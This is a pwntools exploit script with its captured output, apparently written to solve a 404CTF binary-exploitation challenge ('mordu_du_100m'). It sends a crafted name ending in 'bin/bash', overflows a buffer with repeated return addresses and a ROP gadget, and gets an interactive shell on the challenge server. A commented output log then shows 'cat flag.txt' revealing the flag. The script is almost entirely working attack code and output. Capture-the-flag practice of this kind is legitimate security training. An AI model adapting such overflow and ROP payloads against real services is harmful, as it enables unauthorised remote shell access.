from pwn import *

name = b"////////////////////////////////////////////////////////bin/bash"
                                            
while True:                                 
    p = remote('challenges.404ctf.fr',31955)
    #p = process('./mordu_du_100m')

    p.recv()

    p.sendline(name)

    p.recv()

    payload = p64(0x00400787) * 8

    p.sendline(payload)

    p.recv()

    gadget = 0x400cd1
    payload+= (p64(gadget)+p64(0x00400787))*16
    print(payload)
    p.sendline(payload)
    p.interactive()

    p.close()

"""
[*] Switching to interactive mode
####################################################################################
##                                                                                ##
##                                Félicitations à                                 ##
##        ////////////////////////////////////////////////////////bin/bash        ##
##                                                                                ##
##                     pour leur victoire à l'épreuve du 100m                     ##
##                                                                                ##
##                                                                                ##
##                                     "\x87\x07@"                                      ##
##                                                                                ##
##                                  écurie \x87\x07@                                    ##
##                                                                                ##
##                                                             l'équipe 404 CTF   ##
##                                                                                ##
####################################################################################
Woaw ! Comment avez-vous fait ?
////////////////////////////////////////////////////////bin/bash: line 1: $'@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@': command not found
$ cat flag.txt
404CTF{m1Am_m1Am_1_0Ff_By_1}

APRES PLUSIEURS CTRL C des que j'obtient : ////////////////////////////////////////////////////////bin/bash: line 1: $'@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@\321\f@\207\a@': command not found


"""